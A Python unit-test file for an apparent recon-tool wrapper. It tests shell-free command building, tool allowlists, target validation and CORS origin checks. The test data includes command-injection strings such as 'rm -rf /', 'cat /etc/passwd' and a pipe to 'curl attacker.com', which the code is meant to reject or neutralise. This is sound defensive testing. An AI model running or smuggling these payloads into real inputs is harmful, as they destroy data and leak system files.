"""Unit tests for command execution security and validation."""
import pytest
import sys
import os

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

from core.toolkit.registry import get_tool_command, TOOLS
from core.server.api import is_origin_allowed
from pydantic import ValidationError


class TestToolCommandGeneration:
    """Test that tool commands are generated securely without shell injection."""

    def test_get_tool_command_returns_tuple(self):
        """Verify get_tool_command returns (cmd, stdin) tuple."""
        cmd, stdin = get_tool_command("nmap", "example.com")
        assert isinstance(cmd, list)
        assert isinstance(stdin, (str, type(None)))

    def test_tool_without_stdin(self):
        """Tools without stdin flag should have None stdin."""
        cmd, stdin = get_tool_command("nmap", "example.com")
        assert stdin is None
        assert cmd[0] == "nmap"

    def test_tool_with_stdin(self):
        """Tools with stdin=True should return target as stdin input."""
        cmd, stdin = get_tool_command("hakrawler", "https://example.com")
        assert stdin == "https://example.com"
        assert "hakrawler" in cmd
        # Verify bash -lc is NOT in the command
        assert "bash" not in cmd
        assert "-lc" not in cmd

    def test_dnsx_stdin(self):
        """dnsx should use stdin instead of bash pipe."""
        cmd, stdin = get_tool_command("dnsx", "example.com")
        assert stdin == "example.com"
        assert cmd[0] == "dnsx"
        assert "bash" not in cmd

    def test_httprobe_stdin(self):
        """httprobe should use stdin instead of bash pipe."""
        cmd, stdin = get_tool_command("httprobe", "example.com")
        assert stdin == "example.com"
        assert cmd[0] == "httprobe"
        assert "bash" not in cmd

    def test_no_shell_injection_in_target(self):
        """
        Target with shell metacharacters is safe because subprocess uses list args.

        Security comes from NOT using shell=True, not from input sanitization.
        When subprocess.Popen is called with a list, each element is a separate
        argument passed directly to execve() - no shell interpretation occurs.
        """
        malicious_targets = [
            "example.com; rm -rf /",
            "example.com && cat /etc/passwd",
            "example.com | curl attacker.com",
            "example.com`whoami`",
            "example.com$(sleep 10)",
        ]

        for target in malicious_targets:
            cmd, stdin = get_tool_command("nmap", target)
            # Command MUST be a list (not a string) for subprocess safety
            assert isinstance(cmd, list)
            # Verify we're not using bash or sh as the command
            assert "bash" not in cmd
            assert "sh" not in cmd
            # The critical security property: command is a list, not a shell string
            # subprocess.Popen(cmd) with list args bypasses shell entirely


class TestToolAllowlist:
    """Test that only known tools from TOOLS dict can be used."""

    def test_all_tools_in_allowlist(self):
        """Every tool in TOOLS should be accessible via get_tool_command."""
        for tool_name in TOOLS.keys():
            try:
                cmd, stdin = get_tool_command(tool_name, "example.com")
                assert isinstance(cmd, list)
            except KeyError:
                pytest.fail(f"Tool {tool_name} not accessible via get_tool_command")

    def test_invalid_tool_raises_keyerror(self):
        """Requesting a non-existent tool should raise KeyError."""
        with pytest.raises(KeyError):
            get_tool_command("fake_tool_xyz", "example.com")


class TestAPIValidators:
    """Test API request validators enforce tool allowlist."""

    def test_scan_request_valid_modules(self):
        """ScanRequest should accept valid tool names."""
        from core.server.api import ScanRequest

        # Valid tool
        req = ScanRequest(target="example.com", modules=["nmap", "subfinder"])
        assert req.modules == ["nmap", "subfinder"]

    def test_scan_request_invalid_modules_rejected(self):
        """ScanRequest should reject invalid tool names."""
        from core.server.api import ScanRequest

        with pytest.raises(ValidationError) as exc_info:
            ScanRequest(target="example.com", modules=["nmap", "malicious_tool"])

        assert "Invalid tool names" in str(exc_info.value)
        assert "malicious_tool" in str(exc_info.value)

    def test_scan_request_none_modules_allowed(self):
        """ScanRequest should accept None for modules (use all tools)."""
        from core.server.api import ScanRequest

        req = ScanRequest(target="example.com", modules=None)
        assert req.modules is None

    def test_install_request_valid_tools(self):
        """InstallRequest should accept valid tool names."""
        from core.server.api import InstallRequest

        req = InstallRequest(tools=["nmap", "subfinder"])
        assert req.tools == ["nmap", "subfinder"]

    def test_install_request_invalid_tools_rejected(self):
        """InstallRequest should reject invalid tool names."""
        from core.server.api import InstallRequest

        with pytest.raises(ValidationError) as exc_info:
            InstallRequest(tools=["nmap", "evil_tool"])

        assert "Invalid tool names" in str(exc_info.value)
        assert "evil_tool" in str(exc_info.value)


class TestTargetSanitization:
    """Test target input sanitization."""

    def test_scan_request_target_validation(self):
        """ScanRequest should reject dangerous target patterns."""
        from core.server.api import ScanRequest

        dangerous_targets = [
            "example.com; rm -rf /",
            "example.com && malicious",
            "example.com`whoami`",
            "example.com$(sleep 10)",
            "example.com\nmalicious",
            "example.com\rmalicious",
        ]

        for target in dangerous_targets:
            with pytest.raises(ValidationError) as exc_info:
                ScanRequest(target=target)
            assert "Invalid character in target" in str(exc_info.value)

    def test_scan_request_empty_target_rejected(self):
        """ScanRequest should reject empty or whitespace-only targets."""
        from core.server.api import ScanRequest

        with pytest.raises(ValidationError):
            ScanRequest(target="")

        with pytest.raises(ValidationError):
            ScanRequest(target="   ")

    def test_scan_request_valid_target(self):
        """ScanRequest should accept valid targets."""
        from core.server.api import ScanRequest

        valid_targets = [
            "example.com",
            "https://example.com",
            "http://example.com:8080",
            "192.168.1.1",
            "https://subdomain.example.com/path",
        ]

        for target in valid_targets:
            req = ScanRequest(target=target)
            assert req.target == target.strip()


class TestNoShellTrue:
    """Verify shell=True is not used anywhere in subprocess calls."""

    def test_no_shell_in_codebase(self):
        """Grep for shell=True patterns in Python source."""
        import subprocess
        result = subprocess.run(
            ["grep", "-r", "shell=True", "core/", "--include=*.py"],
            capture_output=True,
            text=True,
        )
        # Should find nothing in source code
        assert result.returncode != 0 or not result.stdout.strip(), \
            f"Found shell=True in code:\n{result.stdout}"


class TestCORSSecurity:
    """Test CORS origin validation to prevent wildcard CORS with credentials."""

    def test_exact_origin_match(self):
        """Exact origin matches should be allowed."""
        patterns = ("https://example.com", "http://localhost:8080")
        assert is_origin_allowed("https://example.com", patterns) is True
        assert is_origin_allowed("http://localhost:8080", patterns) is True

    def test_wildcard_port_match(self):
        """Wildcard port patterns should match any port on the same host."""
        patterns = ("http://localhost:*", "http://127.0.0.1:*")
        assert is_origin_allowed("http://localhost:8080", patterns) is True
        assert is_origin_allowed("http://localhost:3000", patterns) is True
        assert is_origin_allowed("http://127.0.0.1:8000", patterns) is True
        assert is_origin_allowed("http://127.0.0.1:9000", patterns) is True

    def test_wildcard_port_rejects_different_host(self):
        """Wildcard port should not match different hosts."""
        patterns = ("http://localhost:*",)
        assert is_origin_allowed("http://example.com:8080", patterns) is False
        assert is_origin_allowed("http://evil.com:8080", patterns) is False

    def test_scheme_mismatch_rejected(self):
        """Scheme mismatches should be rejected."""
        patterns = ("https://localhost:*",)
        assert is_origin_allowed("http://localhost:8080", patterns) is False
        assert is_origin_allowed("ftp://localhost:8080", patterns) is False

    def test_tauri_localhost_accepted(self):
        """Tauri's custom protocol should be accepted for localhost."""
        patterns = ("tauri://localhost",)
        assert is_origin_allowed("tauri://localhost", patterns) is True

    def test_external_origins_rejected(self):
        """External origins should be rejected by default."""
        patterns = ("http://localhost:*", "http://127.0.0.1:*", "tauri://localhost")
        assert is_origin_allowed("https://evil.com", patterns) is False
        assert is_origin_allowed("http://attacker.com", patterns) is False
        assert is_origin_allowed("https://example.com", patterns) is False

    def test_empty_origin_rejected(self):
        """Empty or None origin should be rejected."""
        patterns = ("http://localhost:*",)
        assert is_origin_allowed("", patterns) is False
        assert is_origin_allowed(None, patterns) is False

    def test_no_wildcard_in_response(self):
        """
        Verify our implementation never returns wildcard origin.

        When credentials are enabled, returning "*" as the allowed origin
        violates the CORS spec and browsers will reject the response.
        """
        # This is verified by is_origin_allowed returning boolean
        # The middleware then sets the EXACT origin header
        patterns = ("http://localhost:*",)
        # Function returns True/False, never a wildcard
        result = is_origin_allowed("http://localhost:8080", patterns)
        assert isinstance(result, bool)
        assert result is True


class TestScanEventEmission:
    """Test that scan error events are emitted correctly."""

    def test_scan_failed_event_type_exists(self):
        """Verify SCAN_FAILED event type is defined."""
        from core.cortex.events import GraphEventType
        assert hasattr(GraphEventType, "SCAN_FAILED")
        assert GraphEventType.SCAN_FAILED == "scan_failed"

    def test_graph_event_creation(self):
        """Verify GraphEvent can be created with SCAN_FAILED type."""
        from core.cortex.events import GraphEvent, GraphEventType

        event = GraphEvent(
            type=GraphEventType.SCAN_FAILED,
            payload={"error": "Test error", "target": "example.com"}
        )

        assert event.type == GraphEventType.SCAN_FAILED
        assert event.payload["error"] == "Test error"
        assert event.payload["target"] == "example.com"

    def test_event_bus_has_emit_method(self):
        """Verify EventBus has emit() method for custom events."""
        from core.cortex.events import EventBus, GraphEvent, GraphEventType

        bus = EventBus()
        assert hasattr(bus, "emit")

        # Emit should not crash
        bus.emit(GraphEvent(
            type=GraphEventType.SCAN_FAILED,
            payload={"error": "Test", "target": "test.com"}
        ))


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
